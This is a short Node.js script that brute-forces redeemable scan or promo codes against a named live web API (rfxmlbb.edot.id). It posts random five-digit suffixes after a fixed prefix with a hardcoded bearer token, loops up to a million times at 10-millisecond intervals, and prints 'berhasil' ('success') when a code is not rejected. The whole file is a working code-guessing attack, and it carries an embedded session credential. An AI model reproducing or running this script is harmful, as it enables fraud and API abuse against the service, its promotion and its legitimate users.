var axios = require("axios");

const crypto = require("crypto");

(async function fiveSeconds(n) {
  const generatePassword = (length = 5, wishlist = "0123456789") =>
    Array.from(crypto.randomFillSync(new Uint32Array(length)))
      .map((x) => wishlist[x % wishlist.length])
      .join("");

  var data = JSON.stringify({
    code: `81401${generatePassword()}`,
  });

  console.log(data);

  let bearer =
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3NfdXVpZCI6ImE0YTA0MDJiZjE2NjQ1YjJiM2M3Nzg3ZTM1YWVhNzc0IiwiYXV0aG9yaXplZCI6dHJ1ZSwiZXhwIjoxNjM2MTA3OTE0LCJwYXJ0aWNpcGFudF9pZCI6IjM0NjE2N2JiY2ZkODQxOWQ5YTNlNGJiNzUwMWNkY2UxIn0.TmUL_uKpaTswYN_NBbwV1SIyUhB3K7Zks4z4rja7ffk";
  // bearer login at https://rfxmlbb.edot.id/landing
  var config = {
    method: "post",
    url: `https://rfxmlbb.edot.id/api/scancode/${bearer}`,
    headers: {
      "Content-Type": "application/json",
    },
    data: data,
  };
  await axios(config)
    .then(function (response) {
      console.log(JSON.stringify(response.response.data.dataScanCode.message));
    })
    .catch(function (error) {
      if (error.response) {
        if (error.response.data.dataScanCode.status === 400) {
          console.log(error.response.data.dataScanCode.message);
          console.log(error.response.data.dataScanCode.status);
        } else {
          console.log("berhasil");
        }
      } else {
        console.log("berhasil");
      }
    });
  console.log(n++);
  if (n <= 1000000) setTimeout(fiveSeconds, 10, n); // Redo if n <= 5 (and pass n)
})(0);
